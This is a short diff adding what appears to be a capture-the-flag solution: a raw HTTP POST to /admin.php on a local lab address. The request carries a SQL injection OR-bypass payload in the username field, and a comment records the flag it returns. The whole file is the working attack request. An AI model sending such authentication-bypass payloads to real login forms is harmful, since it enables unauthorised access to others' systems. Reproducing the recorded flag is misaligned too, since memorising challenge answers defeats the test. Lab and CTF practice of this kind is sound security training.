@@ -1,0 +1,8 @@
+# SQL injection OR-bypass on admin login. Returns flag{c969819d-7a14-4c90-b85d-51eccd232580} in response body.
+
+POST /admin.php HTTP/1.1
+Host: 172.17.0.1:41651
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+
+username=admin' OR '1'='1' -- -&password=anything
